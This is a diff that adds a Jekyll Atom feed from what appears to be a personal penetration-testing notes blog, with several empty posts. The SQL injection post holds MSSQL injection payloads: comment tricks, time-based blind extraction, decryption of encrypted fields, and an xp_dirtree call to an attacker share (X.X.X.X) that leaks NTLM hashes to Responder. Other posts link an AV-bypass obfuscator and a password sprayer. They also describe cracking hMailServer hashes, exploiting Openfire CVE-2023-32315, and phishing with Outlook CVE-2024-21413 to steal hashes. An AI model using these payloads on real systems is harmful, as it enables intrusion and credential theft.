@@ -1,0 +1,98 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.5">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2024-06-12T09:49:39-05:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">Your awesome title</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><entry><title type="html">Windows Firewall</title><link href="http://0.0.0.0:4000/2024/06/11/windows-fw.html" rel="alternate" type="text/html" title="Windows Firewall" /><published>2024-06-11T00:00:00-05:00</published><updated>2024-06-11T00:00:00-05:00</updated><id>http://0.0.0.0:4000/2024/06/11/windows-fw</id><content type="html" xml:base="http://0.0.0.0:4000/2024/06/11/windows-fw.html"><![CDATA[]]></content><author><name></name></author><category term="firewall" /><category term="netsh" /><category term="enumeration" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Tools</title><link href="http://0.0.0.0:4000/2024/06/07/tools.html" rel="alternate" type="text/html" title="Tools" /><published>2024-06-07T00:00:00-05:00</published><updated>2024-06-07T00:00:00-05:00</updated><id>http://0.0.0.0:4000/2024/06/07/tools</id><content type="html" xml:base="http://0.0.0.0:4000/2024/06/07/tools.html"><![CDATA[<ul>
+  <li><a href="https://github.com/TaurusOmar/psobf">PSOBF</a></li>
+  <li><a href="https://github.com/boringthegod/AzurePasswordSprayer">AzurePasswordSprayer</a></li>
+</ul>]]></content><author><name></name></author><category term="AV" /><category term="Bypass" /><category term="Password" /><summary type="html"><![CDATA[PSOBF AzurePasswordSprayer]]></summary></entry><entry><title type="html">SQl Injection</title><link href="http://0.0.0.0:4000/2024/06/06/sqli.html" rel="alternate" type="text/html" title="SQl Injection" /><published>2024-06-06T00:00:00-05:00</published><updated>2024-06-06T00:00:00-05:00</updated><id>http://0.0.0.0:4000/2024/06/06/sqli</id><content type="html" xml:base="http://0.0.0.0:4000/2024/06/06/sqli.html"><![CDATA[<h1 id="mssql">MSSQL</h1>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%' --Like
+Valor' 
+Valor' -- -
+</code></pre></div></div>
+
+<h3 id="rce">RCE</h3>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span><span class="k">exec</span> <span class="n">sp_configure</span> <span class="s1">'show advanced options'</span><span class="p">,</span><span class="mi">1</span>
+<span class="p">;</span><span class="k">exec</span> <span class="n">xp_dirtree</span> <span class="s1">'</span><span class="se">\\</span><span class="s1">X.X.X.X</span><span class="se">\s</span><span class="s1">harefolder</span><span class="se">\s</span><span class="s1">harefile'</span> <span class="p">;</span><span class="c1">-- -</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>Responder <span class="nt">-I</span> &lt;iface&gt;
+</code></pre></div></div>
+
+<h3 id="extraer-información">Extraer Información</h3>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">concat</span><span class="p">(</span><span class="o">&lt;</span><span class="k">column</span><span class="o">&gt;</span><span class="p">,</span><span class="o">&lt;</span><span class="n">separator</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="n">column2</span><span class="o">&gt;</span><span class="p">)</span>
+<span class="n">string_add</span><span class="p">(</span><span class="n">concat</span><span class="p">(</span><span class="o">&lt;</span><span class="k">column</span><span class="o">&gt;</span><span class="p">,</span><span class="o">&lt;</span><span class="n">separator</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="n">column2</span><span class="o">&gt;</span><span class="p">),</span><span class="s1">'&lt;separator&gt;'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="time-based">Time Based</h2>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span><span class="nx">IF</span> <span class="mi">1</span><span class="o">=</span><span class="p">(</span><span class="nx">select</span> <span class="mi">1</span> <span class="k">from</span> <span class="nx">sys</span><span class="p">.</span><span class="nx">tables</span> <span class="nx">where</span> <span class="nx">substring</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="dl">'</span><span class="s1">{tablename}</span><span class="dl">'</span><span class="p">)</span> <span class="nx">waitfor</span> <span class="nx">delay</span> <span class="dl">'</span><span class="s1">00:00:05</span><span class="dl">'</span>
+<span class="p">;</span><span class="nx">IF</span> <span class="mi">1</span><span class="o">=</span><span class="p">(</span><span class="nx">select</span> <span class="mi">1</span> <span class="nx">where</span> <span class="nx">substring</span><span class="p">(</span><span class="nx">db_name</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="dl">'</span><span class="s1">h</span><span class="dl">'</span><span class="p">)</span> <span class="nx">waitfor</span> <span class="nx">delay</span> <span class="dl">'</span><span class="s1">00:00:05</span><span class="dl">'</span><span class="p">;</span>
+</code></pre></div></div>
+
+<h1 id="queries">Queries</h1>
+
+<h3 id="get-columns-of-a-table">Get columns of a table</h3>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Select</span> <span class="n">top</span> <span class="mi">1</span> <span class="k">null</span><span class="p">,</span><span class="k">null</span> <span class="k">from</span> <span class="n">sys</span><span class="p">.</span><span class="n">columns</span> <span class="k">c</span> <span class="k">inner</span> <span class="k">join</span> <span class="n">sys</span><span class="p">.</span><span class="n">tables</span> <span class="n">t</span> <span class="k">on</span> 
+<span class="k">c</span><span class="p">.</span><span class="n">object_id</span><span class="o">=</span><span class="n">t</span><span class="p">.</span><span class="n">object_id</span> <span class="k">where</span> <span class="n">t</span><span class="p">.</span><span class="n">name</span><span class="o">=</span><span class="s1">'&lt;tablename&gt;'</span> <span class="k">and</span> <span class="k">substring</span><span class="p">(</span><span class="k">c</span><span class="p">.</span><span class="n">name</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">&lt;</span><span class="k">offset</span><span class="o">&gt;</span><span class="p">)</span><span class="o">=</span><span class="s1">'&lt;letter&gt;'</span>
+</code></pre></div></div>
+
+<h3 id="get-information">Get Information</h3>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Select</span>  <span class="o">*</span> <span class="k">from</span> <span class="o">&lt;</span><span class="k">table</span><span class="o">&gt;</span> <span class="k">where</span> <span class="n">ascii</span><span class="p">(</span><span class="k">substring</span><span class="p">(</span><span class="o">&lt;</span><span class="k">column</span><span class="o">&gt;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=#</span><span class="n">NUMBER</span> <span class="mi">33</span><span class="o">-</span><span class="mi">126</span>
+</code></pre></div></div>
+
+<h3 id="from-encrypted-field">From Encrypted Field</h3>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="o">&lt;</span><span class="k">table</span><span class="o">&gt;</span> <span class="k">where</span> <span class="k">substring</span><span class="p">(</span><span class="k">CONVERT</span><span class="p">(</span><span class="nb">VARCHAR</span><span class="p">(</span><span class="k">MAX</span><span class="p">),</span> <span class="k">CONVERT</span><span class="p">(</span><span class="nb">VARBINARY</span><span class="p">(</span><span class="k">MAX</span><span class="p">),</span> <span class="o">&lt;</span><span class="k">column</span><span class="o">&gt;</span><span class="p">),</span> <span class="mi">2</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="o">&lt;</span><span class="k">offset</span><span class="o">&gt;</span><span class="p">)</span><span class="o">=</span><span class="s1">'&lt;digit|letter&gt;'</span> <span class="c1">--sp_password</span>
+<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="o">&lt;</span><span class="k">table</span><span class="o">&gt;</span> <span class="k">where</span> <span class="k">substring</span><span class="p">(</span><span class="n">DecryptByPassPhrase</span><span class="p">(</span><span class="s1">'&lt;password&gt;'</span><span class="p">,</span> <span class="o">&lt;</span><span class="k">column</span><span class="o">&gt;</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="o">&lt;</span><span class="k">offset</span><span class="o">&gt;</span><span class="p">)</span><span class="o">=</span><span class="s1">'&lt;digit|letter&gt;'</span> <span class="c1">--sp_password</span>
+</code></pre></div></div>]]></content><author><name></name></author><category term="SQL" /><category term="sql injection" /><summary type="html"><![CDATA[MSSQL]]></summary></entry><entry><title type="html">Exiftool</title><link href="http://0.0.0.0:4000/2024/06/05/exiftool.html" rel="alternate" type="text/html" title="Exiftool" /><published>2024-06-05T00:00:00-05:00</published><updated>2024-06-05T00:00:00-05:00</updated><id>http://0.0.0.0:4000/2024/06/05/exiftool</id><content type="html" xml:base="http://0.0.0.0:4000/2024/06/05/exiftool.html"><![CDATA[]]></content><author><name></name></author><category term="exiftool" /><category term="metadata" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">JQ</title><link href="http://0.0.0.0:4000/2024/06/05/linux-jq.html" rel="alternate" type="text/html" title="JQ" /><published>2024-06-05T00:00:00-05:00</published><updated>2024-06-05T00:00:00-05:00</updated><id>http://0.0.0.0:4000/2024/06/05/linux-jq</id><content type="html" xml:base="http://0.0.0.0:4000/2024/06/05/linux-jq.html"><![CDATA[]]></content><author><name></name></author><category term="jq" /><category term="Linux" /><category term="json" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">DNS</title><link href="http://0.0.0.0:4000/2024/06/05/dns.html" rel="alternate" type="text/html" title="DNS" /><published>2024-06-05T00:00:00-05:00</published><updated>2024-06-05T00:00:00-05:00</updated><id>http://0.0.0.0:4000/2024/06/05/dns</id><content type="html" xml:base="http://0.0.0.0:4000/2024/06/05/dns.html"><![CDATA[]]></content><author><name></name></author><category term="DNS" /><category term="dig" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">hMailServer</title><link href="http://0.0.0.0:4000/2024/05/31/hMailServer.html" rel="alternate" type="text/html" title="hMailServer" /><published>2024-05-31T00:00:00-05:00</published><updated>2024-05-31T00:00:00-05:00</updated><id>http://0.0.0.0:4000/2024/05/31/hMailServer</id><content type="html" xml:base="http://0.0.0.0:4000/2024/05/31/hMailServer.html"><![CDATA[<h2 id="weakness">Weakness</h2>
+
+<p>In Windows, the default configuration location is <code>Program Files (x86)\hMailServer\Bin\hMailServer.ini</code>, inside this file, there are some passwords stored as hashes, wich will be crack with <em>hashcat</em>.</p>]]></content><author><name></name></author><category term="SMTP" /><category term="POP" /><category term="IMAP" /><summary type="html"><![CDATA[hMailServer is a free, open-source mail server software for Microsoft Windows. It allows you to set up and manage your own email server, providing features such as SMTP, POP3, and IMAP functionality. With hMailServer, you can create multiple email accounts, domains, and distribution lists, making it suitable for small to medium-sized businesses or individuals who want to host their own email services. It also includes spam protection features, support for multiple languages, and an easy-to-use administration interface. Overall, hMailServer offers a flexible and customizable solution for hosting email services on Windows platforms.]]></summary></entry><entry><title type="html">Openfire</title><link href="http://0.0.0.0:4000/2024/05/31/openfire.html" rel="alternate" type="text/html" title="Openfire" /><published>2024-05-31T00:00:00-05:00</published><updated>2024-05-31T00:00:00-05:00</updated><id>http://0.0.0.0:4000/2024/05/31/openfire</id><content type="html" xml:base="http://0.0.0.0:4000/2024/05/31/openfire.html"><![CDATA[<h2 id="exploit">exploit</h2>
+<p><a href="https://github.com/miko550/CVE-2023-32315">CVE-2023-32315</a></p>
+
+<h3 id="weakness">Weakness</h3>
+
+<p>This exploit creates a random user and random password to authenticate against <strong>Openfire Admin Console</strong>.</p>
+
+<p>Into OpenFire database exist two tables <em>OFUSER</em> and <em>OFPROPERTY</em></p>
+
+<p>It use <a href="https://github.com/c0rdis/openfire_decrypt">Openfire password decryption</a> to get the users passwords.
+The <em>OFUSER</em> table has the password encrypted
+The <em>OFPROPERTY</em> table has the <strong>SecurityKey</strong></p>]]></content><author><name></name></author><category term="CVE-2023-32315" /><summary type="html"><![CDATA[Openfire is a real-time collaboration (RTC) server licensed under the Open Source Apache License. It utilizes the XMPP (Extensible Messaging and Presence Protocol) protocol, which is widely used for instant messaging (IM) and presence information. Developed in Java, Openfire provides a scalable and extensible platform for building customized messaging applications, supporting features such as chat, file transfer, group chat, and more. It offers robust security features, including SSL/TLS encryption and user authentication mechanisms, making it suitable for both small deployments and large-scale enterprise environments. Openfire is highly configurable and can be integrated with various databases and authentication systems, making it a versatile choice for implementing communication solutions across different industries and use cases.]]></summary></entry><entry><title type="html">Tunneling</title><link href="http://0.0.0.0:4000/2024/05/31/tunneling.html" rel="alternate" type="text/html" title="Tunneling" /><published>2024-05-31T00:00:00-05:00</published><updated>2024-05-31T00:00:00-05:00</updated><id>http://0.0.0.0:4000/2024/05/31/tunneling</id><content type="html" xml:base="http://0.0.0.0:4000/2024/05/31/tunneling.html"><![CDATA[<div class="window">
+  <div class="title-bar">
+      <div>
+              <span class="window_dot language-bash"></span>
+              <span class="window_dot bg-warning"></span>
+              <span class="window_dot bg-success"></span>
+      </div>
+  </div>
+  
+  <div class="content">
+
+  </div>
+</div>
+
+<blockquote>
+
+</blockquote>
+
+<h3 id="pivotnacci">pivotnacci</h3>
+
+<p>Source <a href="">here</a></p>]]></content><author><name></name></author><category term="Port Forwarding" /><category term="SOCKS" /><category term="Tunneling" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Outlook</title><link href="http://0.0.0.0:4000/2024/05/29/outlook.html" rel="alternate" type="text/html" title="Outlook" /><published>2024-05-29T00:00:00-05:00</published><updated>2024-05-29T00:00:00-05:00</updated><id>http://0.0.0.0:4000/2024/05/29/outlook</id><content type="html" xml:base="http://0.0.0.0:4000/2024/05/29/outlook.html"><![CDATA[<h2 id="weakness">Weakness</h2>
+
+<p>It is a vulnerability discovered in Outlook that allows reading network resources, thus exposing possible NTLM hashes. For this, a <strong>phishing</strong> attack is necessary since the user must at least view the email.</p>
+
+<h2 id="exploit">exploit</h2>
+
+<p><a href="https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability">CVE-2024-21413</a></p>
+
+<h3 id="usage">Usage</h3>
+
+<p>We need to send an email with embedded malicious code. When the user checks this email, it will try to open shared resources using NTLM hashes</p>
+
+<p>Review the official exploit document to use this exploit. On the attacker machine, open <code>responder -i &#60;interface&#62;</code> to capture NTML hashes and crack them.</p>
+
+<blockquote>
+  <p>You can perform email sending using <a href="/2024/05/29/email.html">swaks</a>.</p>
+</blockquote>]]></content><author><name></name></author><category term="Email" /><category term="CVE-2024-21413" /><summary type="html"><![CDATA[Weakness]]></summary></entry></feed>
